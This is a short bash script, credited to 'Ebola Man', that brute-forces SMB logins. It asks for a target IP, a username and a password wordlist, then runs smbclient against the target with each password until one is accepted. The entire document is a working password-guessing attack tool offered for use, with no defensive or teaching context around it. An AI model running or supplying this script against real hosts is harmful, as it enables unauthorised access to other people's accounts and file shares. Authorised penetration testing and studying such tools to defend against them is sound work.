#!/bin/bash
echo -e "\033[1;32mSMB Bruteforce - by Ebola Man\033[0m"

echo
read -p "Enter IP Address: " ip
read -p "Enter Username: " user
read -p "Enter Password List: " wordlist

count=1

# Loop through each password in the wordlist
while IFS= read -r pass; do
    echo "[ATTEMPT $count] [$pass]"

    # Attempt to connect using smbclient
    smbclient -L //$ip -U $user%$pass > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "Password Found! $pass"
        exit 0
    fi

    count=$((count + 1))
done < "$wordlist"

echo "Password not Found :("
exit 1
